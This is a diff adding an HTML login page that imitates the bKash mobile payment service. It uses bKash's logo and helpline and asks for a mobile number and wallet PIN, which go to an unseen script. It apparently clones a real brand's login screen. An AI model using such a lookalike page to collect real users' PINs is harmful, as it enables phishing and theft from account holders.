@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bKash Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <script defer src="script.js"></script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-container">
+            <img src="/BKash-Logo.wine.svg" alt="bKash Logo">
+        </div>
+        <form id="loginForm">
+            <div class="input-container">
+                <input type="text" id="phoneNumber" placeholder="Enter Mobile Number" required pattern="[0-9]{11}" title="Please enter a valid 11-digit mobile number">
+            </div>
+            <div class="input-container">
+                <input type="password" id="password" placeholder="Enter 4 or 5-digit PIN" required pattern="[0-9]{4,5}" title="Please enter a 4 or 5-digit PIN">
+            </div>
+            <button type="submit">Login</button>
+            <p class="error-message" id="errorMessage"></p>
+        </form>
+        <p class="help-text">Need help? Call <strong>16247</strong></p>
+    </div>
+</body>
+</html>
